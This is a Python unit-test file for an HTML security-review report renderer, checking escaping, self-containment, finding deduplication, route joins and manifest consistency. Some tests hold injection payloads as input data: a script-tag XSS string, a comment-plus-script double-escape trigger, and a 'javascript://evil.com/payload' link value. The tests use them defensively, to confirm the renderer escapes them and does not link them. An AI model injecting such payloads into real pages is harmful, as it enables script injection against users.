#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""render_sdr_report.py unit tests (improve-mgh-sdr-report-html-render task 5.1).

The renderer emits three artifacts per run: the self-contained single-file HTML report
at the repo root, `<run-dir>/sdr_report_data.json` (canonical data), and
`sdr_manifest.json`. Assertions are stdlib-only: JSON equality on the two data
carriers, text-level structure markers on the HTML, and `html.parser` where a DOM
shape matters. No browser is launched (the real-browser acceptance pass is the tasks'
manual item).

Covers: .html filename format, data-file <-> embedded-block JSON equivalence, {dimension,
route, file} triple dedup-merge, .failed units do not block rendering + manifest counts,
same-second atomic overwrite idempotency, honesty-boundary entries, self-containment
(no external references; the w3c SVG namespace identifier is a name, not a fetch),
injection escaping (`</script>` and `<!--`+`<script` inside finding text), P-NN
numbering/anchors data, SVG graph data (branched units only, dashed mapper terminals,
† prefix, linear chains excluded), frontend three-state join, source-link href rules +
degradation (scheme / drive-relative payloads), non-string severity degradation,
failed-unit frontend-column alignment, nested-prefix exact route join, manifest
rows[] == data rows[], and --check (ok / counts mismatch / carrier drift / rows drift /
missing markers / non-html report / report outside repo root).

Run: py tests/test_render_sdr_report.py
"""
import contextlib
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
import importlib.util
from pathlib import Path

HERE = Path(__file__).resolve().parent
SCRIPT = HERE.parent / "core" / "scripts" / "render_sdr_report.py"


VOCAB = HERE.parent / "core" / "scripts" / "human_face_vocab.py"


def _load():
    spec = importlib.util.spec_from_file_location("render_sdr_report", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _load_vocab():
    spec = importlib.util.spec_from_file_location("human_face_vocab", VOCAB)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _embed(mod, html_text):
    """The parsed embedded data block (the HTML's single per-run payload)."""
    m = re.search(r'<script type="application/json" id="mgh-data">(.*?)</script>',
                  html_text, re.S)
    assert m, "no embedded data block in HTML"
    return json.loads(m.group(1))


class RenderSdrReportTest(unittest.TestCase):
    def setUp(self):
        self.m = _load()
        self.tmp = Path(tempfile.mkdtemp(prefix="mgh_sdrrender_"))
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        self.run_dir = self.repo / ".mgh-sdr" / "runs" / "t1"
        (self.run_dir / "markers").mkdir(parents=True)
        (self.run_dir / "drafts").mkdir(parents=True)
        (self.run_dir / "context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template", "external_repos": [],
            "baseline_truncated": False,
        }), encoding="utf-8")

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _draft(self, uid, findings):
        (self.run_dir / "drafts" / f"{uid}.json").write_text(
            json.dumps({"unit": uid, "findings": findings}, ensure_ascii=False),
            encoding="utf-8")
        (self.run_dir / "markers" / f"{uid}.done").write_text("{}", encoding="utf-8")

    def _run(self, *args):
        sys.argv = ["render_sdr_report.py"] + list(args)
        out, err = io.StringIO(), io.StringIO()
        code = None
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                code = self.m.main()
            except SystemExit as e:
                code = e.code
        return code, out.getvalue(), err.getvalue()

    def _render(self):
        code, out, err = self._run("--run-dir", str(self.run_dir),
                                   "--repo", str(self.repo))
        self.assertEqual(code, 0, err)
        payload = json.loads(out)
        report = Path(payload["report"]).read_text(encoding="utf-8")
        data = json.loads((self.run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        manifest = json.loads((self.run_dir / "sdr_manifest.json").read_text(
            encoding="utf-8"))
        return payload, report, data, manifest

    F1 = {"dimension": "horizontal-authz", "severity": "high", "route": "/user/detail",
          "file": "UserController.java", "line_hint": "88-102", "risk": "r1",
          "suggestion": "s1", "control_ref": "横向越权规约"}
    F1_DUP = {"dimension": "horizontal-authz", "severity": "medium", "route": "/user/detail",
              "file": "UserController.java", "line_hint": "110", "risk": "dup",
              "suggestion": "-", "control_ref": None}
    F2 = {"dimension": "sql-injection", "severity": "high", "route": "/user/list",
          "file": "UserController.java", "line_hint": "40", "risk": "r2",
          "suggestion": "s2", "control_ref": None}

    # --- 1.2/2.3 report + data carriers -----------------------------------------

    def test_filename_format_and_data_file(self):
        self._draft("u1", [self.F1])
        payload, report, data, manifest = self._render()
        name = Path(payload["report"]).name
        self.assertRegex(name, r"^mgh-sdr-feature-pay-\d{8}_\d{6}\.html$")
        # canonical data file sits beside the manifest, same dict projected into both
        self.assertEqual(Path(payload["data"]).parent, self.run_dir)
        self.assertEqual(data["rows"], manifest["rows"])
        self.assertEqual(data["meta"]["findings_total"],
                         manifest["counts"]["findings"])

    def test_embed_block_equals_data_file(self):
        self._draft("u1", [self.F1])
        _, report, data, _ = self._render()
        self.assertEqual(_embed(self.m, report), data)

    def test_same_second_overwrite_idempotent(self):
        self._draft("u1", [self.F1])
        # pin datetime to ONE second, render twice -> same report name, atomic overwrite
        real = self.m.datetime

        class _Frozen(real):  # noqa: F821 — subclass of the real datetime
            @classmethod
            def now(cls, tz=None):
                return real(2026, 9, 3, 14, 30, 22).replace(
                    tzinfo=tz) if tz else real(2026, 9, 3, 14, 30, 22)

        try:
            self.m.datetime = _Frozen
            code1, out1, _ = self._run("--run-dir", str(self.run_dir),
                                       "--repo", str(self.repo))
            code2, out2, _ = self._run("--run-dir", str(self.run_dir),
                                       "--repo", str(self.repo))
        finally:
            self.m.datetime = real
        n1 = Path(json.loads(out1)["report"]).name
        n2 = Path(json.loads(out2)["report"]).name
        self.assertEqual(n1, n2)
        self.assertEqual(n1, "mgh-sdr-feature-pay-20260903_143022.html")
        self.assertFalse(list(self.repo.glob("*.tmp")), "tmp leftover on overwrite")
        self.assertFalse(list(self.run_dir.glob("*.tmp")), "tmp leftover in run dir")
        # the second render's carriers are complete (data rewritten, not appended)
        self.assertEqual(_embed(self.m, Path(n2 and (self.repo / n2)).read_text(
            encoding="utf-8")),
            json.loads((self.run_dir / "sdr_report_data.json").read_text(
                encoding="utf-8")))

    def test_never_writes_openspec(self):
        self._draft("u1", [self.F1])
        code, out, _ = self._run("--run-dir", str(self.run_dir), "--repo", str(self.repo))
        self.assertFalse((self.repo / "openspec").exists())

    def test_self_contained_no_external_references(self):
        self._draft("u1", [self.F1])
        _, report, _, _ = self._render()
        # the w3c SVG namespace is an XML namespace IDENTIFIER, never fetched — the only
        # allowed http:// occurrence; everything else must be inline
        stripped = report.replace("http://www.w3.org/2000/svg", "")
        self.assertNotIn("http://", stripped)
        self.assertNotIn("https://", stripped)
        for pat in (r"<script\s+src=", r"<link\s", r"@import", r"<img\s",
                    r"<iframe\s", r"url\("):
            self.assertIsNone(re.search(pat, report, re.I),
                              f"external-reference pattern {pat!r} in report")
        # structure markers the in-page navigation and --check rely on
        for marker in ('id="mgh-data"', 'id="sec-overview"', 'id="sec-summary"',
                       'id="sec-findings"', 'id="sec-graphs"', 'id="sec-ok-units"',
                       'id="sec-boundaries"'):
            self.assertIn(marker, report)
        # no dead escape helper (L7): the page's real safety property is that every
        # dynamic value goes through textContent/setAttribute — the absence is asserted
        # so a dead "just in case" helper cannot creep back with a lying comment
        self.assertNotIn("escapeHtml", report)
        self.assertIn("诚实边界", report)

    def test_injection_escaping_in_embed_block(self):
        self._draft("u1", [dict(self.F1, risk='<script>alert(1)</script> "q" & <b>')])
        _, report, data, _ = self._render()
        # `</` inside the data became `<\/` (legal JSON escape, parse-identical), so the
        # block cannot be terminated by finding text; the embed still parses to the data
        self.assertIn("<\\/script>", report)
        self.assertEqual(_embed(self.m, report), data)
        self.assertEqual(data["findings"][0]["risk"],
                         '<script>alert(1)</script> "q" & <b>')

    def test_hostile_comment_script_quote_keeps_page_js_alive(self):
        # `<!--` followed by `<script` in finding text used to flip the HTML parser into
        # the script-data-double-escaped state: the real </script> was ignored and the
        # page's own render JS was swallowed as data (blank six-section shell; --check
        # was blind to it because its regex stopped at the same ignored terminator).
        self._draft("u1", [dict(self.F1, risk="引述前端片段:<!--<script> 未转义")])
        _, report, data, _ = self._render()
        m = re.search(r'<script type="application/json" id="mgh-data">(.*?)</script>',
                      report, re.S)
        self.assertIsNotNone(m)
        # the double-escape trigger must not exist literally in the block; the \u0021
        # form parses back to the very same characters
        self.assertNotIn("<!--", m.group(1))
        self.assertIn("<\\u0021--", m.group(1))
        self.assertEqual(_embed(self.m, report), data)
        self.assertEqual(data["findings"][0]["risk"],
                         "引述前端片段:<!--<script> 未转义")
        # structure intact: exactly the template's two real terminators (data block +
        # page JS); no literal </script> may leak out of finding text
        self.assertEqual(report.count("</script>"), 2)
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)

    def test_scheme_finding_degrades_href_kept_in_data(self):
        # end-to-end C3: a draft file field carrying a scheme payload renders as plain
        # text (loc.href None), while the canonical data keeps the LLM's raw claim —
        # data is not censored, only not linked
        self._draft("u1", [dict(self.F1, file="javascript://evil.com/payload",
                                line_hint="", line=7)])
        _, report, data, manifest = self._render()
        loc = data["findings"][0]["loc"]
        self.assertIsNone(loc["href"])
        self.assertEqual(loc["text"], "javascript://evil.com/payload:7")
        self.assertEqual(manifest["rows"], data["rows"])
        self.assertEqual(_embed(self.m, report), data)


    # --- merge / failed units / boundaries --------------------------------------

    def test_dedup_merge_by_triple(self):
        self._draft("u1", [self.F1])
        self._draft("u2", [self.F1_DUP, self.F2])
        _, _, data, manifest = self._render()
        self.assertEqual(manifest["counts"]["findings"], 2)  # dup merged: 3 raw -> 2
        self.assertEqual(len(data["findings"]), 2)
        f1 = next(f for f in data["findings"] if f["route"] == "/user/detail")
        self.assertIn("110", f1["line_hint"])                # hint unioned from the dup
        self.assertIn("110", f1["loc"]["text"])

    def test_merge_findings_severity_guard_single_point(self):
        # H1: the guard lives in _merge_findings (render and --check share it); any
        # value outside the str closed-set falls to "medium" — non-strings used to be
        # a hard TypeError (unhashable `in`), hashable junk always degraded silently
        by_dim = self.m._merge_findings([{"unit": "u", "findings": [
            {"dimension": "d", "route": "/r1", "file": "F.java", "severity": ["high"]},
            {"dimension": "d", "route": "/r2", "file": "F.java", "severity": {}},
            {"dimension": "d", "route": "/r3", "file": "F.java", "severity": 5},
            {"dimension": "d", "route": "/r4", "file": "F.java", "severity": "High"},
            {"dimension": "d", "route": "/r5", "file": "F.java", "severity": "high"},
        ]}])
        sev = {r["route"]: r["severity"] for r in by_dim["d"]}
        self.assertEqual(sev, {"/r1": "medium", "/r2": "medium", "/r3": "medium",
                               "/r4": "medium", "/r5": "high"})

    def test_non_string_severity_degrades_not_crashes(self):
        # end-to-end H1: list/dict severity used to traceback out of BOTH the render
        # and the --check path (exit 1, outside the 0/1/2 contract)
        self._draft("u1", [
            {"dimension": "horizontal-authz", "severity": ["high"],
             "route": "/user/detail", "file": "UserController.java",
             "line_hint": "88-102", "risk": "r", "suggestion": "s",
             "control_ref": None},
            {"dimension": "sql-injection", "severity": {}, "route": "/user/list",
             "file": "UserDao.java", "line_hint": "40", "risk": "r2",
             "suggestion": "s2", "control_ref": None}])
        code, out, err = self._run("--run-dir", str(self.run_dir), "--repo",
                                   str(self.repo))
        self.assertEqual(code, 0, err)
        data = json.loads((self.run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        sev = {f["dimension"]: f["severity"] for f in data["findings"]}
        self.assertEqual(sev, {"horizontal-authz": "medium", "sql-injection": "medium"})
        # the abnormal shape is disclosed on stderr, never silently swallowed
        self.assertIn("severity", err)
        # --check shares the same merge: same input must validate clean
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)

    def test_failed_unit_does_not_block(self):
        self._draft("u1", [self.F1])
        (self.run_dir / "markers" / "u9.failed").write_text(
            json.dumps({"unit": "u9", "reason": "path-drift"}), encoding="utf-8")
        code, out, _ = self._run("--run-dir", str(self.run_dir), "--repo", str(self.repo))
        self.assertEqual(code, 0)
        payload = json.loads(out)
        data = json.loads((self.run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        manifest = json.loads((self.run_dir / "sdr_manifest.json").read_text(
            encoding="utf-8"))
        self.assertEqual(payload["counts"]["failed_units"], 1)
        self.assertEqual(manifest["failed_units"][0]["unit"], "u9")
        self.assertEqual(len(data["rows"]), 0)   # failed units never become rows
        self.assertTrue(any("1 个评审单元失败" in b for b in data["boundaries"]))

    def test_unparsable_done_draft_counts_failed(self):
        self._draft("u1", [self.F1])
        (self.run_dir / "drafts" / "ubroken.json").write_text("{not json",
                                                              encoding="utf-8")
        (self.run_dir / "markers" / "ubroken.done").write_text("{}", encoding="utf-8")
        code, out, _ = self._run("--run-dir", str(self.run_dir), "--repo", str(self.repo))
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["counts"]["failed_units"], 1)

    def test_honesty_boundary_at_least_6(self):
        self._draft("u1", [self.F1])
        _, _, data, manifest = self._render()
        self.assertGreaterEqual(len(manifest["boundaries"]), 6)
        self.assertEqual(manifest["boundaries"], data["boundaries"])

    # --- head / overview / disclosure variants ----------------------------------

    def test_unapproved_boundary_and_head_variant(self):
        # declared-but-unauthorized skip: distinct from not-found — head names 未授权,
        # boundaries carry the unapproved entry with the paths
        self.run_dir.joinpath("context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template", "external_repos": [],
            "external_skipped": ["unapproved: D:/xxx/front",
                                 "not-found: D:/xxx/gone"],
            "pending_approval": ["D:\\xxx\\front"],
            "baseline_truncated": False,
        }, ensure_ascii=False), encoding="utf-8")
        self._draft("u1", [self.F1])
        _, _, data, manifest = self._render()
        self.assertEqual(data["meta"]["external_headline"],
                         "无(外部仓未授权,前端相关检查未覆盖)")
        self.assertTrue(any("未经用户确认写入项目配置" in b and "D:/xxx/front" in b
                            for b in manifest["boundaries"]))
        # not-found alone (no unapproved): head stays the unreachable variant
        self.run_dir.joinpath("context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template", "external_repos": [],
            "external_skipped": ["not-found: D:/xxx/gone"],
            "baseline_truncated": False,
        }, ensure_ascii=False), encoding="utf-8")
        _, _, data, _ = self._render()
        self.assertEqual(data["meta"]["external_headline"],
                         "无(未声明 / 不可达降级,前端相关检查未覆盖)")
        self.assertFalse(any("外部仓未授权" in b for b in data["boundaries"]))

    def test_check_ok_with_unapproved_boundaries(self):
        self.run_dir.joinpath("context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template", "external_repos": [],
            "external_skipped": ["unapproved: D:/xxx/front"],
            "pending_approval": ["D:\\xxx\\front"],
            "baseline_truncated": False,
        }, ensure_ascii=False), encoding="utf-8")
        self._draft("u1", [self.F1])
        self._render()
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)

    def test_grouping_overview_and_exclusion_disclosure(self):
        # grouping.json in the run dir -> meta.overview plain-word entries (评审分组 /
        # 调用链分析 / 排除文件) + collapsed 分组诊断 details + the honesty-boundary
        # exclusion entry; manifest counts.excluded_files passes through.
        (self.run_dir / "grouping.json").write_text(json.dumps({
            "repo": str(self.repo), "base": "master", "branch": "feature-pay",
            "empty": False, "codegraph": True, "total": 3,
            "counts": {"interface": 2, "standalone": 1},
            "excluded": {"count": 120, "by_reason": {"test-tree": 80,
                                                     "build-output": 30,
                                                     "static-asset": 10}},
            "codegraph_stats": {"symbols_queried": 9, "edges_captured": 25,
                                "edges_in_changed_set": 12, "anchors_changed": 2,
                                "anchors_upstream": 8, "chain_merged": 1,
                                "excluded_files": 120},
            "pending": [],
        }, ensure_ascii=False), encoding="utf-8")
        self._draft("u1", [self.F1])
        _, report, data, manifest = self._render()
        overview = {o["k"]: o["v"] for o in data["meta"]["overview"]}
        self.assertIn("2 个接口单元", overview["评审分组"])
        self.assertIn("1 个独立文件单元", overview["评审分组"])
        self.assertIn("共 3 个", overview["评审分组"])
        self.assertIn("2 个变更接口作为分组入口", overview["调用链分析"])
        self.assertIn("8 处改动挂接到未变更接口", overview["调用链分析"])
        self.assertIn("同入口链路合并 1 组", overview["调用链分析"])
        self.assertIn("120 个", overview["排除文件"])
        details = "、".join(data["meta"]["overview_details"])
        self.assertIn("捕获调用边 25 条", details)
        self.assertIn("变更集内 12 条", details)
        # collapsed 分组诊断 block: a default-folded <details> rendered by the page JS
        self.assertIn("分组诊断", report)
        self.assertIn('createElement("details")', report)
        # plain-wording guard: the retired grouping jargon is gone from the report
        for retired in ("路由锚", "向上锚定", "链合并", "interface 2", "standalone 1"):
            self.assertNotIn(retired, report)
        self.assertIn("排除披露", "".join(data["boundaries"]))
        self.assertIn("固定排除清单", "".join(data["boundaries"]))
        self.assertIn("test-tree 80", "".join(data["boundaries"]))
        self.assertEqual(manifest["counts"]["excluded_files"], 120)
        code, _, cerr = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, cerr)

    def test_no_grouping_json_renders_without_overview(self):
        # older run layout: no grouping.json -> no overview entries, no rows
        self._draft("u1", [self.F1])
        _, _, data, _ = self._render()
        self.assertEqual(data["meta"]["overview"], [])
        self.assertEqual(data["rows"], [])
        self.assertGreaterEqual(len(data["boundaries"]), 6)

    # --- 简报表 rows + row_links (new report structure) --------------------------

    CHAIN_A = [
        {"fqn_short": "OrderController.submit", "label": "OrderController.submit",
         "file": "src/main/java/com/x/controller/OrderController.java", "line": 42,
         "change": "changed", "route": "/order/submit"},
        {"fqn_short": "OrderServiceImpl.submit", "label": "OrderServiceImpl.submit",
         "file": "src/main/java/com/x/service/OrderServiceImpl.java", "line": 60,
         "change": "changed"},
        {"fqn_short": "OrderDao.insertOrder", "label": "OrderDao.insertOrder",
         "file": "src/main/java/com/x/dao/OrderDao.java", "line": 30, "change": "changed"},
        {"fqn_short": "OrderDaoMapper.xml", "label": "OrderDaoMapper.xml:insertOrder",
         "file": "src/main/resources/mapper/OrderDaoMapper.xml", "line": None,
         "change": "external", "branch_of": 2},
    ]
    CHAIN_B = [
        {"fqn_short": "UserController.list", "label": "UserController.list",
         "file": "src/main/java/com/x/controller/UserController.java", "line": 12,
         "change": "unchanged", "route": "/user/list"},
        {"fqn_short": "UserService.queryUser", "label": "UserService.queryUser",
         "file": "src/main/java/com/x/service/UserService.java", "line": 80,
         "change": "changed"},
        {"fqn_short": "LogDao.insertLog", "label": "LogDao.insertLog",
         "file": "src/main/java/com/x/dao/LogDao.java", "line": 20, "change": "changed"},
        {"fqn_short": "UserDao.findById", "label": "UserDao.findById",
         "file": "src/main/java/com/x/dao/UserDao.java", "line": 25, "change": "changed",
         "branch_of": 1},
    ]

    def _grouping(self, units):
        (self.run_dir / "grouping.json").write_text(json.dumps({
            "repo": str(self.repo), "base": "master", "branch": "feature-pay",
            "empty": False, "codegraph": True, "total": len(units),
            "counts": {"interface": sum(1 for u in units if u["kind"] == "interface"),
                       "standalone": sum(1 for u in units if u["kind"] == "standalone")},
            "excluded": {"count": 0, "by_reason": {}},
            "codegraph_stats": {"anchors_changed": 1, "anchors_upstream": 1,
                                "chain_merged": 0, "edges_captured": 5,
                                "edges_in_changed_set": 3},
            "units": units,
            "pending": [],
        }, ensure_ascii=False), encoding="utf-8")

    def test_summary_rows_sort_and_row_links(self):
        # 2 interface units (routes /order/submit + /user/list) + 1 standalone:
        # rows sorted interface-by-route then standalone; row_links segments de-linkify
        # to the exact plain-text chain; failed unit never becomes a row
        self._grouping([
            {"unit_id": "UserController_list", "kind": "interface",
             "route": "/user/list", "chain": self.CHAIN_B, "status": "done"},
            {"unit_id": "OrderController_submit", "kind": "interface",
             "route": "/order/submit", "chain": self.CHAIN_A, "status": "done"},
            {"unit_id": "utils_Helper", "kind": "standalone", "route": "",
             "chain": [], "status": "done"},
            {"unit_id": "broken_Unit", "kind": "interface", "route": "/aaa/broken",
             "chain": [], "status": "failed"},
        ])
        self._draft("OrderController_submit", [{
            "dimension": "vertical-authz", "severity": "high", "route": "/order/submit",
            "file": "OrderController.java", "line_hint": "40-50", "line": 42,
            "risk": "无权限校验", "suggestion": "补权限注解", "control_ref": None}])
        self._draft("UserController_list", [{
            "dimension": "sql-injection", "severity": "medium", "route": "/user/list",
            "file": "UserDao.java", "line_hint": "20-30", "risk": "拼接SQL",
            "suggestion": "改#{}", "control_ref": "SQL规约"}])
        _, _, data, manifest = self._render()
        self.assertEqual([r["unit_id"] for r in data["rows"]],
                         ["OrderController_submit", "UserController_list",
                          "utils_Helper"])
        # † unchanged entry + branch marker ride the plain text (CHAIN_B has no mapper
        # terminal — its branch is a java fan-out; ⇢ is covered in ChainSegmentsTest)
        user_row = next(r for r in manifest["rows"]
                        if r["unit_id"] == "UserController_list")
        self.assertTrue(user_row["chain"].startswith("†UserController.list"))
        self.assertIn("⤷", user_row["chain"])
        # row_links: separators stay outside the hrefs; de-linkified join == chain text.
        # interface-row entry is a route string and NEVER links — the 类名.方法名 short
        # forms in the chain cell carry the source links
        by_unit = {rl["unit_id"]: rl for rl in data["row_links"]}
        self.assertIsNone(by_unit["UserController_list"]["entry"]["href"])
        segs = by_unit["UserController_list"]["chain"]
        self.assertEqual("".join(s["sep"] + s["text"] for s in segs),
                         user_row["chain"])
        self.assertEqual(segs[0]["href"],
                         "src/main/java/com/x/controller/UserController.java#L12")
        self.assertFalse(segs[-1]["sep"] and segs[-1]["sep"].strip() == "→",
                         "branch separator must be ⤷, not →")
        self.assertEqual(segs[-1]["sep"], " ⤷")
        # dimension refs: P-NN pure text in rows (machine face), href in row_links (view)
        self.assertEqual(user_row["issue_refs"], ["P-02"])
        self.assertEqual(data["findings"][1]["pnum"], "P-02")
        # standalone row: entry = first-chain-node short form (empty chain -> entry text)
        st = next(r for r in manifest["rows"] if r["unit_id"] == "utils_Helper")
        self.assertEqual(st["entry"], "utils_Helper")

    def test_frontend_two_columns_three_states(self):
        self.run_dir.joinpath("context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template",
            "external_repos": [{"slug": "front", "path": "D:/f",
                                "route_hits": [{"route": "/order/submit", "count": 2},
                                               {"route": "/user/list", "count": 0}]}],
            "baseline_truncated": False,
        }), encoding="utf-8")
        self._grouping([
            {"unit_id": "OrderController_submit", "kind": "interface",
             "route": "/order/submit", "chain": self.CHAIN_A, "status": "done"},
            {"unit_id": "UserController_list", "kind": "interface",
             "route": "/user/list", "chain": self.CHAIN_B, "status": "done"},
            {"unit_id": "OrderController_batch", "kind": "interface",
             "route": "/order/batch", "chain": [], "status": "done"},
            # merged multi-route unit: join on the MAIN route (first segment) only
            {"unit_id": "OrderController_merged", "kind": "interface",
             "route": "/order/batch;/order/submit", "chain": [], "status": "done"},
        ])
        _, _, data, manifest = self._render()
        by_entry = {r["entry"]: r for r in manifest["rows"]}
        self.assertEqual(by_entry["/order/submit"]["frontend_is"], "是")
        self.assertEqual(by_entry["/order/submit"]["frontend_count"], "2 处")
        self.assertEqual(by_entry["/user/list"]["frontend_is"], "否")
        self.assertEqual(by_entry["/user/list"]["frontend_count"], "—")
        self.assertEqual(by_entry["/order/batch"]["frontend_is"], "未知")
        # merged unit's main route /order/batch is undeclared => 未知 despite the
        # secondary segment /order/submit having hits
        self.assertEqual(by_entry["/order/batch(+1)"]["frontend_is"], "未知")
        self.assertEqual(len(manifest["rows"]), 4)
        self.assertEqual(data["rows"], manifest["rows"])

    def test_failed_unit_keeps_frontend_columns_aligned(self):
        # H2: 1 failed + 2 ok, hits measured for ONE ok route — each row must carry its
        # OWN unit's values. The old code zipped rows against the FULL sorted unit list
        # while rows were built skipping failed units: from the first failed unit on,
        # everything shifted (the row paired with the failed one kept its "—"
        # placeholder; every later row inherited the PREVIOUS unit's values — wrong
        # data into manifest/data/HTML, --check blind to it).
        self.run_dir.joinpath("context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template",
            "external_repos": [{"slug": "front", "path": "D:/f",
                                "route_hits": [{"route": "/bbb/x", "count": 2}]}],
            "baseline_truncated": False,
        }), encoding="utf-8")
        self._grouping([
            {"unit_id": "aaa_broken", "kind": "interface", "route": "/aaa/broken",
             "chain": [], "status": "failed"},     # sorts first: maximizes the shift
            {"unit_id": "bbb_X", "kind": "interface", "route": "/bbb/x",
             "chain": [], "status": "done"},
            {"unit_id": "ccc_Y", "kind": "interface", "route": "/ccc/y",
             "chain": [], "status": "done"},
        ])
        payload, report, data, manifest = self._render()
        self.assertEqual([r["entry"] for r in manifest["rows"]], ["/bbb/x", "/ccc/y"])
        by_entry = {r["entry"]: r for r in manifest["rows"]}
        self.assertEqual(by_entry["/bbb/x"]["frontend_is"], "是")
        self.assertEqual(by_entry["/bbb/x"]["frontend_count"], "2 处")
        self.assertEqual(by_entry["/ccc/y"]["frontend_is"], "未知")
        self.assertEqual(by_entry["/ccc/y"]["frontend_count"], "—")
        # three carriers agree and --check accepts the aligned output
        self.assertEqual(data["rows"], manifest["rows"])
        self.assertEqual(_embed(self.m, report), data)
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)

    def test_nested_prefix_routes_exact_join(self):
        # M11: /api/user and /api/user/list are prefix-nested; route_hits are counted
        # per exact route, so the join must be exact too. Substring containment used
        # to light up the long route from the short route's hits ("无前端使用" shown
        # as 有 — a directional lie to the reviewer).
        hits = [{"route": "/api/user", "count": 3}]
        self.run_dir.joinpath("context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template",
            "external_repos": [{"slug": "front", "path": "D:/f", "route_hits": hits}],
            "baseline_truncated": False,
        }), encoding="utf-8")
        self._grouping([
            {"unit_id": "api_User", "kind": "interface", "route": "/api/user",
             "chain": [], "status": "done"},
            {"unit_id": "api_UserList", "kind": "interface", "route": "/api/user/list",
             "chain": [], "status": "done"},
        ])
        _, _, data, manifest = self._render()
        by_entry = {r["entry"]: r for r in manifest["rows"]}
        self.assertEqual(by_entry["/api/user"]["frontend_is"], "是")
        self.assertEqual(by_entry["/api/user"]["frontend_count"], "3 处")
        self.assertEqual(by_entry["/api/user/list"]["frontend_is"], "未知")
        self.assertEqual(by_entry["/api/user/list"]["frontend_count"], "—")
        # reverse nesting: hits only on the LONG route must not light the short one
        self.run_dir.joinpath("context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template",
            "external_repos": [{"slug": "front", "path": "D:/f",
                                "route_hits": [{"route": "/api/user/list",
                                                "count": 1}]}],
            "baseline_truncated": False,
        }), encoding="utf-8")
        _, _, data, manifest = self._render()
        by_entry = {r["entry"]: r for r in manifest["rows"]}
        self.assertEqual(by_entry["/api/user/list"]["frontend_is"], "是")
        self.assertEqual(by_entry["/api/user/list"]["frontend_count"], "1 处")
        self.assertEqual(by_entry["/api/user"]["frontend_is"], "未知")

    def test_pnn_anchors_data(self):
        # P-NN global + severity-asc ordering; each table ref maps to exactly one
        # 章节二 entry whose pnum is the in-page anchor id the page JS emits
        self._grouping([
            {"unit_id": "OrderController_submit", "kind": "interface",
             "route": "/order/submit", "chain": self.CHAIN_A, "status": "done"},
        ])
        self._draft("OrderController_submit", [{
            "dimension": "vertical-authz", "severity": "high", "route": "/order/submit",
            "file": "OrderController.java", "line_hint": "42", "line": 42, "risk": "r",
            "suggestion": "s", "control_ref": None}])
        _, report, data, _ = self._render()
        pnums = [f["pnum"] for f in data["findings"]]
        self.assertEqual(pnums, ["P-01"])
        self.assertEqual(data["rows"][0]["issue_refs"], ["P-01"])
        # the anchor targets are created by the page JS from the data; the template
        # carries the finding container and the link-building code
        self.assertIn('id="sec-findings"', report)
        self.assertIn('setAttribute("id", f.pnum)', report)
        # 调用链两级展示:主链 + 缩进分支子块(视图层分组,段序与字形不变)
        self.assertIn("chain-main", report)
        self.assertIn("chain-sub", report)

    def test_extension_dimension_chinese_label(self):
        # free-text extension dims are sanctioned by the fan-out task; an observed
        # extension shows its curated Chinese label in the column header and finding
        # titles, while the machine face keeps the raw kebab key
        self.assertEqual(self.m._dim_col("architecture-layering"), "架构分层")
        self.assertEqual(self.m._DIMENSION_LABEL["architecture-layering"], "架构分层")
        self.assertEqual(self.m._dim_col("never-seen-dim"), "never-seen-dim")
        self._grouping([
            {"unit_id": "OrderController_submit", "kind": "interface",
             "route": "/order/submit", "chain": self.CHAIN_A, "status": "done"},
        ])
        self._draft("OrderController_submit", [{
            "dimension": "architecture-layering", "severity": "low",
            "route": "/order/submit", "file": "OrderController.java",
            "line_hint": "42", "risk": "控制器内直拼 DAO 调用",
            "suggestion": "下沉 service 层", "control_ref": None}])
        _, _, data, manifest = self._render()
        self.assertEqual(data["dimension_columns"][-1], "architecture-layering")
        self.assertEqual(data["meta"]["dimension_cols"]["architecture-layering"],
                         "架构分层")
        ext = next(f for f in data["findings"]
                   if f["dimension"] == "architecture-layering")
        self.assertEqual(ext["dimension_label"], "架构分层")
        self.assertEqual(manifest["rows"][0]["issue_refs"], [ext["pnum"]])

    # --- 章节三 SVG graph data ----------------------------------------------------

    def test_svg_graphs_branched_units_only(self):
        # CHAIN_B has a real branch (non-external node with branch_of); CHAIN_A's only
        # branch_of is its ⇢ mapper terminal = a LINEAR direct-dao chain -> NO graph.
        self._grouping([
            {"unit_id": "OrderController_submit", "kind": "interface",
             "route": "/order/submit", "chain": self.CHAIN_A, "status": "done"},
            {"unit_id": "UserController_list", "kind": "interface",
             "route": "/user/list", "chain": self.CHAIN_B, "status": "done"},
            {"unit_id": "UserController_two", "kind": "interface",
             "route": "/user/two", "chain": self.CHAIN_B[:2], "status": "done"},
        ])
        _, _, data, _ = self._render()
